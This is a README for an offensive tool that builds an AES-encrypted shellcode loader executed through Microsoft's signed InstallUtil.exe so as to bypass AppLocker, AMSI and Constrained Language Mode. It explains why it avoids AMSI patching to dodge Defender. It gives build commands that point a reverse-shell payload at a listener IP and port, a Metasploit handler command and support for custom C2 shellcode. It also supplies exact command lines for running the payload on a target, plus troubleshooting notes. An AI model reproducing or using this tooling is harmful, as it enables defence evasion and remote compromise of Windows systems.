# installutil

Loader executed via `InstallUtil.exe` (LOLBAS).

Signed Microsoft binary, whitelisted by default AppLocker rules — shellcode runs in the `InstallUtil.exe` process, no PowerShell spawn, bypasses AppLocker / AMSI / CLM.

Triggered by the `[RunInstaller(true)]` + `Installer.Uninstall()` pattern invoked with `/U`.

AES-256-CBC + RW -> RX + D/Invoke. **No AMSI/ETW patches** — InstallUtil doesn't spawn PowerShell (so AMSI isn't in the picture) and patching `AmsiScanBuffer` from managed code is behavior-detected by Defender (the `B8 57 00 07 80 C3` byte pattern + `VirtualProtect` on `amsi.dll` triggers kill-on-write). Shellcode runs in native RX memory, out of AMSI's reach anyway.

## Example

```bash
# Build
./build_installutil.py -l 192.168.x.x -p 443

# Start handler
msfconsole -q -r Update_handler.rc

# Custom shellcode (Sliver/Mythic/CS)
./build_installutil.py --shellcode /path/to/shellcode.bin
```

## Run on target

Always use the **absolute path** to `InstallUtil.exe`, and match the architecture.

**x64 payload (default):**

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\Update.exe
```

**x86 payload:**

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\Update.exe
```

## Troubleshooting

`System.BadImageFormatException: Could not load file or assembly 'file:///...Update.exe'`

- Arch mismatch — x64 `.exe` cannot be loaded by x86 `InstallUtil` and vice versa. Use `Framework64\v4.0.30319\InstallUtil.exe` for the default x64 payload.
- Missing `System.Configuration.Install.dll` — already referenced at compile time via `-reference:System.Configuration.Install.dll`. On the target it lives in the GAC at `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Configuration.Install\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.Install.dll`.
- Relative path to `InstallUtil.exe` (`InstallUtil.exe /U ...`) can fail under AppLocker — always use the absolute Framework path.
